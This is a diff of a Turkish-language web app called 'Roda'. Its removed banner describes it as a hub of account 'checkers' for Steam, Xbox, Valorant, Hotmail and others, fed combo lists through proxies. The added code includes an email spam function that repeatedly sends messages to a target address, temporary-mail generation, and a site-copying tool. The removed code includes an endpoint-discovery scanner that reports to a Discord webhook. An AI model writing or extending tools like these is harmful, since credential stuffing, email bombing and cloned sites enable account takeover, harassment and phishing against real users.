-    alert(parsedLines.length + " satır Checker'a aktarıldı!");
-}
-function clearParse() {
-    document.getElementById("parseInput").value = "";
-    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
-    parsedLines = [];
-    document.getElementById("parseCount").innerText = "0 satır";
-    document.getElementById("parseValid").innerText = "0 geçerli";
-}
-function loadParseFile() {
-    var input = document.createElement("input");
-    input.type = "file";
-    input.accept = ".txt";
-    input.onchange = function(e) {
-        var file = e.target.files[0];
-        if (!file) return;
-        var reader = new FileReader();
-        reader.onload = function(event) {
-            document.getElementById("parseInput").value = event.target.result;
-            parseData();
-        };
-        reader.readAsText(file);
-    };
-    input.click();
+function parseToChecker(){
+    var container=document.getElementById("parseResult");
+    var lines=container.querySelectorAll(".parse-line");
+    var text="";
+    lines.forEach(el=>text+=el.textContent+"\n");
+    document.getElementById("checkerCombo").value=text.trim();
+    alert("Checker'a aktarıldı!");
 }
 
-// ============================================================
-// LOGLAR (ADMIN)
-// ============================================================
-function refreshLogs() {
-    if (!isAdmin) return;
-    fetch("/api/logs?key=" + encodeURIComponent(currentKey))
-        .then(r => r.json())
-        .then(d => {
-            if (d.error) { alert(d.error); return; }
-            var container = document.getElementById("logsContainer");
-            var html = d.logs.map(log => {
-                var color = log.level === "ERROR" ? "var(--r)" : (log.level === "SUCCESS" ? "var(--g)" : "var(--muted)");
-                return `<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:${color}">[${log.timestamp}] ${log.message}</div>`;
-            }).join('');
-            container.innerHTML = html || '<div style="color:var(--muted)">Henüz log yok.</div>';
-        });
+function refreshLogs(){
+    if(!isAdmin) return;
+    fetch("/api/logs?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
+        if(d.error) return alert(d.error);
+        var container=document.getElementById("logsContainer");
+        container.innerHTML=d.logs.map(log=>'<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:'+(log.level==="ERROR"?"var(--r)":log.level==="SUCCESS"?"var(--g)":"var(--muted)")+'">['+log.timestamp+'] '+log.message+'</div>').join('')||'<div style="color:var(--muted)">Henüz log yok.</div>';
+    });
 }
 
-// ============================================================
-// SİTE KOPYALA (ADMIN)
-// ============================================================
-function copySite() {
-    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
-    var url = document.getElementById("siteCopyUrl").value.trim();
-    if (!url) { document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ URL girin!</span>'; return; }
-    document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--gold)">⏳ Kopyalanıyor...</span>';
-    fetch("/api/sitecopy?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ url: url })})
-    .then(function(r){
-        if (!r.ok) return r.json().then(function(d){ throw new Error(d.error || "Bilinmeyen hata"); });
+function loadKeys(){
+    if(!isAdmin) return;
+    fetch("/api/admin/keys?key="+encodeURIComponent(currentKey)).then(r=>r.json()).then(d=>{
+        if(d.error) return alert(d.error);
+        var list=document.getElementById("keyList");
+        var html="";
+        for(var k in d){
+            var v=d[k], exp=v.expires?new Date(v.expires).toLocaleString():"Süresiz";
+            var ip=v.bound_ip||"Bağlanmamış", used=v.used?"✅ Kullanıldı":"❌ Kullanılmadı";
+            html+='<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong>'+k+'</strong><br><small style="color:var(--muted)">'+v.note+' | '+exp+' | IP:'+ip+' | '+used+'</small></div><button class="btn sm r" onclick="deleteKey(\''+k+'\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
+        }
+        list.innerHTML=html||'<p style="color:var(--muted)">Hiç key yok.</p>';
+    });
+}
+function generateKey(){
+    if(!isAdmin) return;
+    var note=document.getElementById("genNote").value||"Oluşturuldu";
+    var hours=document.getElementById("genHours").value;
+    fetch("/api/admin/generate", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({master_key:currentKey, note:note, hours:hours})})
+    .then(r=>r.json()).then(d=>{ if(d.success){ alert("Key: "+d.key+"\nBitiş: "+d.expires); loadKeys(); } else alert("Başarısız"); });
+}
+function deleteKey(target){
+    if(!confirm("Sil?")) return;
+    fetch("/api/admin/delete", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({master_key:currentKey, target_key:target})})
+    .then(r=>r.json()).then(d=>{ if(d.success) loadKeys(); });
+}
+
+function copySite(){
+    if(!isAdmin) return alert("Admin girişi yapın!");
+    var url=document.getElementById("siteCopyUrl").value.trim();
+    if(!url) return alert("URL girin!");
+    document.getElementById("siteCopyResult").innerHTML="Kopyalanıyor...";
+    fetch("/api/sitecopy?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({url:url})})
+    .then(r=>{
+        if(!r.ok) return r.json().then(d=>{throw new Error(d.error)});
         return r.blob();
     })
-    .then(function(blob){
-        var a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "kopyalanan_site.html";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--g)">✅ Site kopyalandı ve indirildi!</span>';
+    .then(blob=>{
+        var a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download="kopyalanan_site.html"; a.click();
+        document.getElementById("siteCopyResult").innerHTML="✅ Kopyalandı!";
     })
-    .catch(function(e){ document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
+    .catch(e=>document.getElementById("siteCopyResult").innerHTML="❌ Hata: "+e.message);
 }
 
-// ============================================================
-// SAYFA GEÇİŞİ (SABİT MENÜ)
-// ============================================================
-function switchPage(page) {
-    if ((page === "discovery" || page === "stats" || page === "keys" || page === "logs" || page === "sitecopy") && !isAdmin) {
-        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
-        return;
-    }
-    document.querySelectorAll(".nav-item").forEach(function(el) {
-        el.classList.remove("active");
+function generateTempMail(){
+    if(!isAdmin) return alert("Admin girişi yapın!");
+    document.getElementById("tempMailInput").value="Üretiliyor...";
+    fetch("/api/temp_mail_generate?key="+encodeURIComponent(currentKey), {method:"POST"})
+    .then(r=>r.json()).then(d=>{
+        if(d.success){ tempMailToken=d.token; document.getElementById("tempMailInput").value=d.email; document.getElementById("tempMailInbox").innerHTML="E-posta oluşturuldu. Gelen kutusunu yenileyin."; document.getElementById("tempMailContent").innerHTML=""; }
+        else alert("Hata: "+d.error);
     });
-    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
-    if (el) el.classList.add("active");
-    document.querySelectorAll(".page").forEach(function(el) {
-        el.classList.remove("active");
+}
+function copyTempMail(){
+    var val=document.getElementById("tempMailInput").value;
+    if(val && val!=="Üretiliyor...") navigator.clipboard.writeText(val).catch(()=>{});
+}
+function refreshTempMail(){
+    if(!isAdmin || !tempMailToken) return alert("Önce e-posta oluşturun!");
+    document.getElementById("tempMailInbox").innerHTML="Yükleniyor...";
+    fetch("/api/temp_mail_refresh?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({token:tempMailToken})})
+    .then(r=>r.json()).then(d=>{
+        if(d.success && d.messages){
+            var html="";
+            d.messages.forEach(msg=>{ html+='<div onclick="readTempMail(\''+msg.id+'\')" style="padding:8px;border-bottom:1px solid var(--border);cursor:pointer;">📩 '+msg.from.address+' - '+msg.subject+'</div>'; });
+            document.getElementById("tempMailInbox").innerHTML=html||"Kutu boş.";
+        }else document.getElementById("tempMailInbox").innerHTML="Hata: "+d.error;
     });
-    var pg = document.getElementById("page-" + page);
-    if (pg) pg.classList.add("active");
-    var titles = {
-        checker: "Checker",
-        proxy: "Proxy",
-        discovery: "API Keşif",
-        parse: "Ayrıştırma",
-        stats: "İstatistik",
-        keys: "Key Yönetimi",
-        logs: "Loglar",
-        sitecopy: "Site Kopyala"
-    };
-    document.getElementById("pageTitle").innerText = titles[page] || page;
-    if (page === "keys" && isAdmin) loadKeys();
-    if (page === "logs" && isAdmin) refreshLogs();
-    if (page === "stats") {
-        document.getElementById("statScans").innerText = 1;
-        document.getElementById("statLast").innerText = new Date().toLocaleString();
-    }
 }
-
-// ============================================================
-// PROXY FONKSİYONLARI
-// ============================================================
-function fetchProxies() {
-    document.getElementById("proxyCount").innerText = "Çekiliyor...";
-    fetch("/api/fetch_proxies")
-        .then(function(r){ return r.json(); })
-        .then(function(d){
-            if (d.success) {
-                document.getElementById("proxyList").value = d.proxies.join("\n");
-                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
-            }
-        })
-        .catch(function(e){ document.getElementById("proxyCount").innerText = "Başarısız"; });
-}
-
-function clearProxies() {
-    document.getElementById("proxyList").value = "";
-    document.getElementById("proxyCount").innerText = "0 proxy";
-}
-
-function toggleProxy() {
-    useProxy = document.getElementById("useProxy").checked;
-}
-
-// ============================================================
-// ADMIN FONKSİYONLARI (KEY YÖNETİMİ + API KEŞİF)
-// ============================================================
-function loadKeys() {
-    if (!isAdmin) return;
-    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
-        .then(function(r){ return r.json(); })
-        .then(function(d){
-            if (d.error) { alert(d.error); return; }
-            var list = document.getElementById("keyList");
-            var html = "";
-            for (var k in d) {
-                var v = d[k];
-                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
-                var ip = v.bound_ip || "Bağlanmamış";
-                var used = v.used ? "✅ Kullanıldı" : "❌ Kullanılmadı";
-                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">' +
-                    '<div><strong style="font-size:13px">' + k + '</strong><br>' +
-                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
-                    '<button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
-            }
-            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
-        })
-        .catch(function(e){ console.error(e); });
-}
-
-function generateKey() {
-    if (!isAdmin) return;
-    var note = document.getElementById("genNote").value || "Oluşturuldu";
-    var hours = document.getElementById("genHours").value;
-    fetch("/api/admin/generate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, note: note, hours: hours })
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-        if (d.success) {
-            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
-            loadKeys();
-        } else alert("Başarısız: " + (d.error || ""));
-    })
-    .catch(function(e){ alert("Hata: " + e.message); });
-}
-
-function deleteKey(target) {
-    if (!isAdmin) return;
-    if (!confirm("Bu anahtarı sil?")) return;
-    fetch("/api/admin/delete", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, target_key: target })
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-        if (d.success) loadKeys();
-        else alert("Silinemedi");
-    })
-    .catch(function(e){ alert("Hata: " + e.message); });
-}
-
-// ============================================================
-// API KEŞİF (SADECE ADMIN)
-// ============================================================
-function updateStatsUI() {
-    if (!isAdmin) return;
-    document.getElementById("totalCount").innerText = foundEndpoints.length;
-    document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e){ return e.category === "Auth"; }).length;
-    var api = foundEndpoints.filter(function(e){ return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e){ return e.category === "Admin"; }).length;
-    document.getElementById("authCount").innerText = auth;
-    document.getElementById("apiCount").innerText = api;
-    document.getElementById("adminCount").innerText = admin;
-    document.getElementById("sideAuth").innerText = auth;
-    document.getElementById("sideAPI").innerText = api;
-    document.getElementById("sideAdmin").innerText = admin;
-    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-}
-
-function startScan() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
-    if (scanning) return;
-    var domain = document.getElementById("targetDomain").value.trim();
-    if (!domain) return alert("Hedef domain girin");
-    var btn = document.getElementById("scanBtn");
-    btn.disabled = true;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
-    scanning = true;
-    foundEndpoints = [];
-    document.getElementById("resultsList").innerHTML = "";
-    document.getElementById("statusDot").classList.remove("idle");
-    document.getElementById("statusText").innerText = "Taranıyor";
-    updateStatsUI();
-
-    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
-    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
-    if (useProxy && proxyList.length) {
-        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
-    }
-    eventSource = new EventSource(url);
-    eventSource.onmessage = function(e){
-        if (e.data === "[DONE]") {
-            eventSource.close();
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
-            scanning = false;
-            document.getElementById("statusDot").classList.add("idle");
-            document.getElementById("statusText").innerText = "Boşta";
-            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
-            document.getElementById("statLast").innerText = new Date().toLocaleString();
-            return;
-        }
-        try {
-            var res = JSON.parse(e.data);
-            foundEndpoints.push(res);
-            addResultRow(res);
-            updateStatsUI();
-        } catch (err) {}
-    };
-    eventSource.onerror = function(){
-        eventSource.close();
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
-        scanning = false;
-        document.getElementById("statusDot").classList.add("idle");
-        document.getElementById("statusText").innerText = "Boşta";
-    };
-}
-
-function addResultRow(res) {
-    var list = document.getElementById("resultsList");
-    var row = document.createElement("div");
-    row.className = "result-row";
-    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
-    var cc = "cat-" + res.category.toLowerCase();
-    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
-    if (checked.includes(res.category)) list.appendChild(row);
-}
-
-document.getElementById("filterContainer").addEventListener("change", function(){
-    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c){ return c.value; });
-    var list = document.getElementById("resultsList");
-    list.innerHTML = "";
-    foundEndpoints.forEach(function(res){
-        if (checked.includes(res.category)) {
-            var row = document.createElement("div");
-            row.className = "result-row";
-            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
-            var cc = "cat-" + res.category.toLowerCase();
-            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-            list.appendChild(row);
-        }
+function readTempMail(msgId){
+    if(!isAdmin || !tempMailToken) return;
+    document.getElementById("tempMailContent").innerHTML="Yükleniyor...";
+    fetch("/api/temp_mail_read?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({token:tempMailToken, msg_id:msgId})})
+    .then(r=>r.json()).then(d=>{
+        if(d.success){
+            var msg=d.message;
+            document.getElementById("tempMailContent").innerHTML='<div style="background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;"><div><strong>Kimden:</strong> '+msg.from.address+'</div><div><strong>Konu:</strong> '+msg.subject+'</div><div style="margin-top:8px;">'+(msg.text||'').replace(/\n/g,'<br>')+'</div></div>';
+        }else document.getElementById("tempMailContent").innerHTML="Hata: "+d.error;
     });
-});
-
-function sendWebhook() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (!url) return alert("Webhook URL girin");
-    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
-    if (!categories.length) return alert("En az bir kategori seçin");
-    if (!foundEndpoints.length) return alert("Önce tarama yapın");
-    fetch("/api/admin/webhook", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(d){ alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
-    .catch(function(e){ alert("Hata: " + e.message); });
 }
 
-function exportJSON() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
+function startSpam(){
+    if(!isAdmin) return alert("Admin girişi yapın!");
+    var email=document.getElementById("spamEmailInput").value.trim();
+    if(!email) return alert("Hedef e-posta girin!");
+    if(spamInterval) return;
+    document.getElementById("spamStopBtn").style.display="inline-block";
+    var log=document.getElementById("spamLog");
+    log.innerHTML+='<div style="color:var(--gold)">[Sistem] '+email+' için spam başlatıldı...</div>';
+    function send(){
+        if(!spamInterval) return;
+        fetch("/api/spam_send?key="+encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({email:email})})
+        .then(r=>r.json()).then(d=>{ log.innerHTML+='<div style="color:'+(d.success?'var(--g)':'var(--r)')+'">['+new Date().toLocaleTimeString()+'] '+(d.message||'Hata')+'</div>'; log.scrollTop=log.scrollHeight; });
     }
-    if (!foundEndpoints.length) return alert("Veri yok");
-    var blob = new Blob([JSON.stringify(foundEndpoints, null, 2)], { type: "application/json" });
-    var a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = "roda_api_scan.json";
-    a.click();
+    spamInterval=setInterval(send, 3000);
+    send();
+}
+function stopSpam(){
+    clearInterval(spamInterval);
+    spamInterval=null;
+    document.getElementById("spamStopBtn").style.display="none";
+    document.getElementById("spamLog").innerHTML+='<div style="color:var(--r)">[Sistem] Spam durduruldu.</div>';
 }
 </script>
 </body>
@@ -2168,15 +1242,6 @@ if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
         save_keys({})
     port = int(os.environ.get("PORT", 5000))
-    print("""
-    ╔══════════════════════════════════════════════════════════════════╗
-    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
-    ║     Render Free Plan Uyumlu                                    ║
-    ║     http://0.0.0.0:""" + str(port) + """                               ║
-    ║     Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook          ║
-    ║     TABII | XBOX | WOLFTEAM | CRAFTRISE | HOTMAIL | STEAM    ║
-    ║     VALORANT | TOKEN | TIKTOK GEN | SİTE KOPYALA             ║
-    ║     KAR TANELERİ ARKA PLAN                                   ║
-    ╚══════════════════════════════════════════════════════════════════╝
-    """)
+    print(f"🚀 Roda çalışıyor: http://0.0.0.0:{port}")
+    print(f"🔑 Master Key: {MASTER_KEY}")
     app.run(host="0.0.0.0", port=port, debug=False)
